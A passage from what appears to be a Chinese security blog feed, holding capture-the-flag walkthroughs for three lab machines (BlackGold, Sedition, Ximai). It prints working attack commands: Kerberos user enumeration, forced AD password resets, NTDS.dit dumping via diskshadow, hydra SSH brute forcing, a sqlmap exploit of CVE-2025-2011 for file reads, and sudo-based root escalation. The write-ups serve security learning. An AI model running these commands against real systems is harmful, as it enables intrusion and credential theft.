        print(f"[*] 共下载了 {found_files_count} 个 PDF 文件到 '{OUTPUT_DIR}' 目录。")
    else:
        print("[*] 未找到任何可用的文件。")

if __name__ == "__main__":
    fuzz_and_download()
```

## 用户枚举

将作者 `author` 和 `Creator` 信息截取出来

```bash
exiftool PDF/found_pdfs/* | grep -E 'Author|Creator' | grep -v 'Neptune Oil & Gas' | cut -d: -f 2 | sed 's/^ *//' | sort | uniq > users.txt
```

使用`kerbrute` 枚举

```bash
➜  BlackGold kerbrute -users users.txt -domain neptune.thl -dc-ip 192.168.56.10
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Valid user => Lucas.Miller
[*] No passwords were discovered :'(
```

找到用户名`Lucas.Miller`

 再尝试一下再`PDF`文件中读取有关`Lucas.Miller` 的

```bash
➜  BlackGold pdfgrep -i 'Lucas.Miller' PDF/found_pdfs/*     
PDF/found_pdfs/2023-01-12.pdf:Estimado Lucas Miller,
PDF/found_pdfs/2023-01-12.pdf:   ● Nombre de usuario (Usuario AD): lucas.miller@neptune.thl
```

![image.png](/post-images/TheHackersLabsBlackGold/image5.png)

得到一串密码 `E@6q%TnR7UEQSXywr8^@`

测试凭据是否有效

```bash
➜  BlackGold nxc smb neptune.thl -u 'Lucas.Miller' -p 'E@6q%TnR7UEQSXywr8^@'
SMB         192.168.56.10   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:neptune.thl) (signing:True) (SMBv1:False) 
SMB         192.168.56.10   445    DC01             [+] neptune.thl\Lucas.Miller:E@6q%TnR7UEQSXywr8^@ 

➜  BlackGold nxc ldap neptune.thl -u 'Lucas.Miller' -p 'E@6q%TnR7UEQSXywr8^@'
LDAP        192.168.56.10   389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:neptune.thl)
LDAP        192.168.56.10   389    DC01             [+] neptune.thl\Lucas.Miller:E@6q%TnR7UEQSXywr8^@ 
```

## 域分析

上 `BloodHound` 分析一波

```bash
➜  BlackGold bloodhound-python -d 'neptune.thl' -ns 192.168.56.10 --zip -c All -dc 'DC01.neptune.thl' -u 'Lucas.Miller' -p 'E@6q%TnR7UEQSXywr8^@' 
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: neptune.thl
INFO: Getting TGT for user
INFO: Connecting to LDAP server: DC01.neptune.thl
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: DC01.neptune.thl
INFO: Found 8 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.neptune.thl
INFO: Done in 00M 01S
INFO: Compressing output into 20250715122943_bloodhound.zip
```

`users` 组

![image.png](/post-images/TheHackersLabsBlackGold/image6.png)

观察了一下，用户`Victor Rodriguez` 的密码写在了`Description` 上

![image.png](/post-images/TheHackersLabsBlackGold/image7.png)

并且其属于`IT`组，在`SMB`中有一个`IT`的共享文件夹

![image.png](/post-images/TheHackersLabsBlackGold/image8.png)

远程管理组用户有两个，暂时是横向目标

![image.png](/post-images/TheHackersLabsBlackGold/image9.png)

## 横向移动

### To emma.johnson

测试上面的凭据

```bash
➜  BlackGold nxc smb neptune.thl -u 'Victor.Rodriguez' -p 'H5gVCzzZkzJ#wGsT8u1$'
SMB         192.168.56.10   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:neptune.thl) (signing:True) (SMBv1:False) 
SMB         192.168.56.10   445    DC01             [+] neptune.thl\Victor.Rodriguez:H5gVCzzZkzJ#wGsT8u1$
```

`SMB`里面能得到一个`powershell`脚本

```bash
➜  BlackGold smbclient //192.168.56.10/IT -U neptune.thl/Victor.Rodriguez%'H5gVCzzZkzJ#wGsT8u1$'            
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Feb 27 08:14:40 2025
  ..                                DHS        0  Fri Feb 28 03:52:00 2025
  Scripts                             D        0  Thu Feb 27 08:16:55 2025

                10540543 blocks of size 4096. 7161242 blocks available
smb: \> cd Scripts\
smb: \Scripts\> ls
  .                                   D        0  Thu Feb 27 08:16:55 2025
  ..                                  D        0  Thu Feb 27 08:14:40 2025
  backup.ps1                          A     1957  Thu Feb 27 08:20:11 2025

                10540543 blocks of size 4096. 7161244 blocks available
smb: \Scripts\> get backup.ps1 
getting file \Scripts\backup.ps1 of size 1957 as backup.ps1 (382.2 KiloBytes/sec) (average 382.2 KiloBytes/sec)
```

打开后能得到用户`emma.johnson` 的凭据，密码：`sb9TVndq8N@tUVMmP2@#`

![image.png](/post-images/TheHackersLabsBlackGold/image10.png)

`emma.johnson` 是我们在上面看到在远程管理组里面的用户

```bash
➜  BlackGold nxc winrm neptune.thl -u 'emma.johnson' -p 'sb9TVndq8N@tUVMmP2@#'
WINRM       192.168.56.10   5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:neptune.thl)
  arc4 = algorithms.ARC4(self._key)
WINRM       192.168.56.10   5985   DC01             [+] neptune.thl\emma.johnson:sb9TVndq8N@tUVMmP2@# (Pwn3d!)
```

![image.png](/post-images/TheHackersLabsBlackGold/image11.png)

该用户能得到 `user.txt`

```bash
*Evil-WinRM* PS C:\Users\Emma Johnson\Desktop> type user.txt
a5xxxxxxxxxxxxxxxxxxxxxxxx
```

### To thomas.brown

当前用户权限

![image.png](/post-images/TheHackersLabsBlackGold/image12.png)

下一个用户包是`Thomas Brown` ，因为他属于`BACKUP OPERATORS`

![image.png](/post-images/TheHackersLabsBlackGold/image13.png)

重新导入下`BloodHound`的数据

```bash
	bloodhound-python -d 'neptune.thl' -ns 192.168.56.10 --zip -c All -dc 'DC01.neptune.thl' -u 'emma.johnson' -p 'sb9TVndq8N@tUVMmP2@#'
```

### GPO 滥用 **❌**

能看到`emma.johnson` 有新的权限

![image.png](/post-images/TheHackersLabsBlackGold/image14.png)

该组策略影响很多用户

![image.png](/post-images/TheHackersLabsBlackGold/image15.png)

使用`bloodyAD`来实现

赋予`emma.johnson`自己拥有对该 `GPO` 的 `genericAll` 权限

```bash
➜  BlackGold bloodyAD -d 'neptune.thl' --dc-ip 192.168.56.10 -u 'emma.johnson' -p 'sb9TVndq8N@tUVMmP2@#' add genericAll 'CN={037ECEDE-7C98-4D00-95D5-4283F4271B0D},CN=POLICIES,CN=SYSTEM,DC=NEPTUNE,DC=THL' 'emma.johnson'
[+] emma.johnson has now GenericAll on CN={037ECEDE-7C98-4D00-95D5-4283F4271B0D},CN=POLICIES,CN=SYSTEM,DC=NEPTUNE,DC=THL
```

这里很奇怪，这里使用了好几个工具也无法利用

```bash
python3 GPOwned.py -u 'emma.johnson' -p 'sb9TVndq8N@tUVMmP2@#' -d 'neptune.thl' -dc-ip '192.168.56.10' -gpcmachine -gpoimmtask -name '{037ECEDE-7C98-4D00-95D5-4283F4271B0D}' -author 'neptune.thl\Administrador' -taskname 'Beautiful IOC' -taskdescription 'Hello World' -dstpath 'c:\windows\system32\calc.exe'
```

![image.png](/post-images/TheHackersLabsBlackGold/image16.png)

最后看了`WP`发现人家的和我不一样

### Force Change PassWord

这里重新导入了一下机器，然后再次导入新的数据，就可以看到`emma.johnson`可以修改`thomas`的密码

![image.png](/post-images/TheHackersLabsBlackGold/image17.png)

通过 `BloodAD`修改密码

```bash
➜  BlackGold bloodyAD -d 'neptune.thl' --dc-ip 192.168.56.10 -u 'emma.johnson' -p 'sb9TVndq8N@tUVMmP2@#' set password thomas.brown Admin@123
[+] Password changed successfully!
```

登录`thomas.brown`账户

![image.png](/post-images/TheHackersLabsBlackGold/image18.png)

### 转储 NTDS

上面我们就知道`thomas.brown` 属于`BACKUP OPERATORS` 组

`whoami`信息中也能看出来

![image.png](/post-images/TheHackersLabsBlackGold/image19.png)

利用：https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges.html?highlight=backup%20op#using-diskshadowexe

因为`winrm`是非交互会话，我们需要对其进行修改

```bash
echo "set context persistent nowriters" > C:\Windows\Temp\ntds_shadow.txt
echo "add volume C: alias shadow_c" >> C:\Windows\Temp\ntds_shadow.txt
echo "create" >> C:\Windows\Temp\ntds_shadow.txt
echo "expose %shadow_c% Z:" >> C:\Windows\Temp\ntds_shadow.txt
diskshadow /s C:\Windows\Temp\ntds_shadow.txt
```

```bash
robocopy /B Z:\Windows\NTDS\ C:\rev ntds.dit
robocopy /B Z:\Windows\System32\config\ C:\rev SYSTEM
```

再通过 `secretdump` 转储出来

![image.png](/post-images/TheHackersLabsBlackGold/image20.png)

## 总结

常规思路，除了有些坑]]></content:encoded>
            <category>靶机</category>
            <category>TheHackersLabs</category>
            <category>Windows</category>
            <category>NTDS</category>
            <category>exiftool</category>
            <category>Domain</category>
            <category>AD</category>
        </item>
        <item>
            <title><![CDATA[TheHackersLabs - Sedition]]></title>
            <link>https://www.sunsetaction.top/2025/07/14/TheHackersLabsSedition</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/07/14/TheHackersLabsSedition</guid>
            <pubDate>Mon, 14 Jul 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[Sedition https://labs.thehackerslabs.com/machine/117 Recon 扫描出来是非常规端口 没有Web端口，我们只能从SMB上手 首先尝试使用匿名账户进行访问 backup里面有一个压缩包，下载 ZIP Crack 解压压缩包需要密码 john转换后爆...]]></description>
            <content:encoded><![CDATA[
# Sedition

> https://labs.thehackerslabs.com/machine/117
> 

![image.png](/post-images/TheHackersLabsSedition/image.png)

## Recon

```bash
➜  Sedition nmap -sT -min-rate 10000 192.168.56.87      
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-14 21:30 CST
Nmap scan report for 192.168.56.87
Host is up (0.0037s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
MAC Address: 08:00:27:8B:04:C6 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 13.32 seconds
```

扫描出来是非常规端口

```bash
➜  Sedition nmap -sT -A -p 139,445 192.168.56.87        
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-14 21:34 CST
Nmap scan report for 192.168.56.87
Host is up (0.00049s latency).

PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
MAC Address: 08:00:27:8B:04:C6 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop

Host script results:
|_clock-skew: -3s
| smb2-time: 
|   date: 2025-07-14T13:34:54
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: SEDITION, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

TRACEROUTE
HOP RTT     ADDRESS
1   0.49 ms 192.168.56.87

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.50 seconds
```

没有`Web`端口，我们只能从`SMB`上手

首先尝试使用匿名账户进行访问

```bash
➜  Sedition smbclient -L 192.168.56.87 -U anonymous
Password for [WORKGROUP\anonymous]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        backup          Disk      
        IPC$            IPC       IPC Service (Samba Server)
        nobody          Disk      Home Directories
Reconnecting with SMB1 for workgroup listing.
smbXcli_negprot_smb1_done: No compatible protocol selected by server.
Protocol negotiation to server 192.168.56.87 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available
```

`backup`里面有一个压缩包，下载

![image.png](/post-images/TheHackersLabsSedition/image1.png)

## ZIP Crack

解压压缩包需要密码

```bash
➜  Sedition unzip secretito.zip  
Archive:  secretito.zip
[secretito.zip] password password: 
   skipping: password                incorrect password
```

`john`转换后爆破

```bash
➜  Sedition zip2john secretito.zip > ziphash.txt                                 
ver 1.0 efh 5455 efh 7875 secretito.zip/password PKZIP Encr: 2b chk, TS_chk, cmplen=34, decmplen=22, crc=F2E5967A ts=969D cs=969d type=0

➜  Sedition john --wordlist=/usr/share/wordlists/rockyou.txt ziphash.txt         
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
sebastian        (secretito.zip/password)     
1g 0:00:00:00 DONE (2025-07-14 21:40) 50.00g/s 819200p/s 819200c/s 819200C/s 123456..cocoliso
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

解压后得到一个密码 `elbunkermolagollon123`

![image.png](/post-images/TheHackersLabsSedition/image2.png)

这里尝试了很多用户名尝试登录`SMB`，但是都是失败了

## 端口扫描 v2

再枚举一下端口

UDP

```bash
➜  Sedition nmap -sU -min-rate 5000 192.168.56.87
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-14 21:46 CST
Nmap scan report for 192.168.56.87
Host is up (0.00022s latency).
Not shown: 993 open|filtered udp ports (no-response)
PORT      STATE  SERVICE
137/udp   open   netbios-ns
5353/udp  closed zeroconf
17845/udp closed unknown
25375/udp closed unknown
41702/udp closed unknown
46093/udp closed unknown
51456/udp closed unknown
MAC Address: 08:00:27:8B:04:C6 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 13.74 seconds
```

TCP 所有端口

```bash
➜  Sedition nmap -sT -min-rate 10000 -p- 192.168.56.87
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-14 21:48 CST
Nmap scan report for 192.168.56.87
Host is up (0.00037s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT      STATE SERVICE
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
65535/tcp open  unknown
MAC Address: 08:00:27:8B:04:C6 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 17.75 seconds
```

多了个 `65535` ，扫描一下详细信息

```bash
➜  Sedition nmap -sT -A -p 65535 192.168.56.87
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-14 21:50 CST
Nmap scan report for 192.168.56.87
Host is up (0.00040s latency).

PORT      STATE SERVICE VERSION
65535/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)
| ssh-hostkey: 
|   256 32:ca:e5:d1:12:c2:1e:11:1e:58:43:32:a0:dc:03:ab (ECDSA)
|_  256 79:3a:80:50:61:d9:96:34:e2:db:d6:1e:65:f0:a9:14 (ED25519)
MAC Address: 08:00:27:8B:04:C6 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.41 ms 192.168.56.87

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.32 seconds
```

Ohya？SSH，`hydra`爆破一下用户名

```bash
hydra -L /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt  -p elbunkermolagollon123 -t 12 -s 65535 -Vv 192.168.56.87 ssh  
```

得到用户名 `cowboy`

![image.png](/post-images/TheHackersLabsSedition/image3.png)

## 权限提升

### In cowboy shell

查看`sudo`权限

```bash
cowboy@Sedition:~$ sudo -l
[sudo] contraseña para cowboy: 
Sorry, user cowboy may not run sudo on sedition.
```

寻找`sid`权限文件

```bash
cowboy@Sedition:~$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/umount
/usr/bin/chfn
/usr/bin/su
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/mount
```

突然注意到`.bash_history` 没有被重定向到 `/dev/null`

```bash
cowboy@Sedition:~$ ls -al
total 24
drwx------ 2 cowboy cowboy 4096 jul  6 20:08 .
drwxr-xr-x 4 root   root   4096 jul  6 18:56 ..
-rw------- 1 cowboy cowboy   78 jul 14 16:09 .bash_history
-rw-r--r-- 1 cowboy cowboy  220 jul  6 18:56 .bash_logout
-rw-r--r-- 1 cowboy cowboy 3526 jul  6 18:56 .bashrc
-rw-r--r-- 1 cowboy cowboy  807 jul  6 18:56 .profile
cowboy@Sedition:~$ cat .bash_history 
history
exit
mariadb
mariadb -u cowboy -pelbunkermolagollon123
su debian
exit
```

扒拉 `users` 表

```bash
MariaDB [bunker]> select * from users;
+--------+----------------------------------+
| user   | password                         |
+--------+----------------------------------+
| debian | 7c6a180b36896a0a8c02787eeafb0e4c |
+--------+----------------------------------+
1 row in set (0,000 sec)
```

爆破密码

```bash
➜  Sedition john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5 hash 
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=8
Press 'q' or Ctrl-C to abort, almost any other key for status
password1        (?)     
1g 0:00:00:00 DONE (2025-07-14 22:17) 100.0g/s 38400p/s 38400c/s 38400C/s 123456..michael1
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed. 
```

### In debian shell

当前用户家目录下能拿到 `user.txt`

```bash
debian@Sedition:~$ cat flag.txt 
pixxxxxxxxxxxxxxxxxxxxxx
```

`sudo` 权限

```bash
debian@Sedition:~$ sudo -l
Matching Defaults entries for debian on sedition:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User debian may run the following commands on sedition:
    (ALL) NOPASSWD: /usr/bin/sed
```

结束：https://gtfobins.github.io/gtfobins/sed/

![image.png](/post-images/TheHackersLabsSedition/image4.png)

读取 `root.txt`

```bash
# cat root.txt
laxxxxxxxxxxxxxxxxxxxxxxxxxx
```

## 总结

超级常规]]></content:encoded>
            <category>靶机</category>
            <category>TheHackersLabs</category>
            <category>Linux</category>
            <category>SMB</category>
            <category>ZIPcrack</category>
            <category>sed</category>
        </item>
        <item>
            <title><![CDATA[HackMyVM - Ximai]]></title>
            <link>https://www.sunsetaction.top/2025/07/14/HackMyVMXimai</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/07/14/HackMyVMXimai</guid>
            <pubDate>Mon, 14 Jul 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[Ximai https://hackmyvm.eu/machines/machine.php?vm=Ximai Notes：More than one path to initial access. PS: 靶机的文件夹名字是Ximai，不是Ximia，做的时候打错了。 Recon 访问 HTTP ...]]></description>
            <content:encoded><![CDATA[
# Ximai

> https://hackmyvm.eu/machines/machine.php?vm=Ximai
> 

Notes：**More than one path to initial access.**

![image.png](/post-images/HackMyVMXimai/image.png)

PS: 靶机的文件夹名字是`Ximai`，不是`Ximia`，做的时候打错了。

## Recon

```bash
➜  Ximia nmap -sT -min-rate 10000 192.168.56.62 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-13 20:32 CST
Nmap scan report for 192.168.56.62
Host is up (0.0012s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
8000/tcp open  http-alt
MAC Address: 08:00:27:91:AC:2B (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 13.50 seconds
```

```bash
➜  Ximia nmap -sT -A -p 22,80,3306,8000 192.168.56.62
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-13 20:33 CST
Nmap scan report for 192.168.56.62
Host is up (0.0036s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
80/tcp   open  http    Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: Apache2 Ubuntu Default Page: It works
3306/tcp open  mysql   MariaDB 10.3.23 or earlier (unauthorized)
8000/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: NeonGrid Solutions
|_http-open-proxy: Proxy might be redirecting requests
|_http-generator: WordPress 6.8.1
|_http-server-header: Apache/2.4.62 (Debian)
MAC Address: 08:00:27:91:AC:2B (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   3.57 ms 192.168.56.62

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.01 seconds
```

访问 `HTTP` ，`80`端口是默认页面

![image.png](/post-images/HackMyVMXimai/image1.png)

`8080`端口是`wordpress`，并且给出了一个信息

![image.png](/post-images/HackMyVMXimai/image2.png)

信息是：

![image.png](/post-images/HackMyVMXimai/image3.png)

`80`端口扫描一下目录，`8000`端口直接上`WPScan`

```bash
➜  Ximia feroxbuster --url http://192.168.56.62 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --filter-status 404,503 -x php,zip,txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.56.62
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 💢  Status Code Filters   │ [404, 503]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, zip, txt]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      278c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET     1022l     5262w    85827c http://192.168.56.62/info.php
[>-------------------] - 1s      1233/882208  39m     found:1       errors:2      
[>-------------------] - 1s      1148/882180  840/s   http://192.168.56.62/                
200      GET      376l      965w    10938c http://192.168.56.62/
200      GET       37l      185w    19268c http://192.168.56.62/that-place-where-i-put-that-thing-that-time/1b260614-3aff-11f0-ac81-000c2921b441.jpg
200      GET        4l       31w      167c http://192.168.56.62/that-place-where-i-put-that-thing-that-time/creds.txt
[####################] - 6m    882228/882228  0s      found:5       errors:2      
[####################] - 6m    882180/882180  2628/s  http://192.168.56.62/ 
[####################] - 0s    882180/882180  32673333/s http://192.168.56.62/that-place-where-i-put-that-thing-that-time/ => Directory listing (add --scan-dir-listings to scan)  
```

下面是`80`端口中扫描出来的页面

![image.png](/post-images/HackMyVMXimai/image4.png)

(?说我吗😭)

![image.png](/post-images/HackMyVMXimai/image5.png)

这个`creds.txt`可能还有点用，因为`mysqli.allow_local_infile`也开启着，可以通过数据库去读

![image.png](/post-images/HackMyVMXimai/image6.png)

接下来看`Wpscan` 的结果，扫描到存在 `SQL`注入，`CVE-2025-2011`

![image.png](/post-images/HackMyVMXimai/image7.png)

## CVE-2025-2011

POC：https://github.com/datagoboom/CVE-2025-2011

但是这里通过`POC`无法进行利用

![image.png](/post-images/HackMyVMXimai/image8.png)

我们观察`POC`，尝试使用`SQLmap`来扫

![image.png](/post-images/HackMyVMXimai/image9.png)

```bash
sqlmap -u "http://wordpress.local:8000/wp-admin/admin-ajax.php?s=test*&perpage=20&page=1&orderBy=source_id&dateEnd=&dateStart=&order=DESC&sources=&action=depicter-lead-index" -batch  
```

![image.png](/post-images/HackMyVMXimai/image10.png)

这样就可以扫描出来了，我们根据前面的线索来直接读取文件 `/etc/jimmy.txt`

```bash
sqlmap -u "http://wordpress.local:8000/wp-admin/admin-ajax.php?s=test*&perpage=20&page=1&orderBy=source_id&dateEnd=&dateStart=&order=DESC&sources=&action=depicter-lead-index" -batch --file-read /etc/jimmy.txt
```

```bash
➜  files cat _etc_jimmy.txt 
HandsomeHU
```

`ssh` 登录

![image.png](/post-images/HackMyVMXimai/image11.png)

## 权限提升

当头一棒

```bash
jimmy@Ximai:~$ ls
sorry, you are restricted from using this command.
```

查看环境变量

```bash
jimmy@Ximai:~$ echo $PATH
./...
```

直接恢复一下环境变量就行了

```bash
jimmy@Ximai:~$ export PATH="/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin"
```

当前目录下能读取`user.txt`

```bash
jimmy@Ximai:~$ cat us3r.txt 
flag{user-ffbea0a7-3b01-11f0-9160-000c2921b441}
```

查看`sudo`权限

```bash
jimmy@Ximai:~$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for jimmy: 
Sorry, user jimmy may not run sudo on Ximai.
```

查看`wp-config.php`

```bash
/** Database username */
define( 'DB_USER', 'root' );       
                                                                                                
/** Database password */                                                                        
define( 'DB_PASSWORD', 'SuperSecret' ); 
```

数据库表信息

```bash
MariaDB [wordpress]> select * from wp_users;
+----+------------+-----------------------------------------------------------------+---------------+-----------------+----------+---------------------+---------------------+-------------+--------------+
| ID | user_login | user_pass                                                       | user_nicename | user_email      | user_url | user_registered     | user_activation_key | user_status | display_name |
+----+------------+-----------------------------------------------------------------+---------------+-----------------+----------+---------------------+---------------------+-------------+--------------+
|  1 | adminer    | $wp$2y$10$ylcSQukwQZAMcFcQTmFzVuJhcr6CoEflSJs6pSiA9OG0JWOpAEYVq | adminer       | no@thankyou.com |          | 2025-05-28 10:35:26 |                     |           0 | adminer      |
+----+------------+-----------------------------------------------------------------+---------------+-----------------+----------+---------------------+---------------------+-------------+--------------+
1 row in set (0.000 sec)
```

尝试密码爆破，这里使用`rockyou`无法爆破出来，太慢了

```bash
➜  Ximia john --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt hash
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
```

使用`cupp`生成弱密码字典进行尝试

![image.png](/post-images/HackMyVMXimai/image12.png)

也不能破解，我们通过`top 100`加上用户名制作字典

```bash
➜  Ximia cat /usr/share/seclists/Passwords/xato-net-10-million-passwords-100.txt | awk '{print "adminer"$1}' > maybe.txt
```

得到密码 `adminer123456`

![image.png](/post-images/HackMyVMXimai/image13.png)

查看 `sudo` 权限

```bash
adminer@Ximai:~$ sudo -l
Matching Defaults entries for adminer on Ximai:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User adminer may run the following commands on Ximai:
    (ALL) NOPASSWD: /usr/bin/grep
```

```bash
adminer@Ximai:~$ sudo /usr/bin/grep 
sorry, you are restricted from using this command.try egrep instead.
```

666字符串

```bash
adminer@Ximai:~$ cat /usr/bin/grep
echo 'sorry, you are restricted from using this command.try egrep instead.'
```

查看权限，有写入权限

```bash
adminer@Ximai:~$ ls -al /usr/bin/grep
-rwxr-xrwx 1 root root 76 May 28 09:06 /usr/bin/grep
```

直接梭哈

```bash
adminer@Ximai:~$ cat /bin/bash > /usr/bin/grep
adminer@Ximai:~$ sudo grep
root@Ximai:/home/adminer# 
```

读取 `root.txt`

```bash
root@Ximai:~# cat r00t.txt 
flag{root-126e5653-3b02-11f0-b074-000c2921b441}
```]]></content:encoded>
            <category>靶机</category>
            <category>HackMyVM</category>
            <category>Linux</category>
            <category>WordPress</category>
            <category>CVE-2025-2011</category>
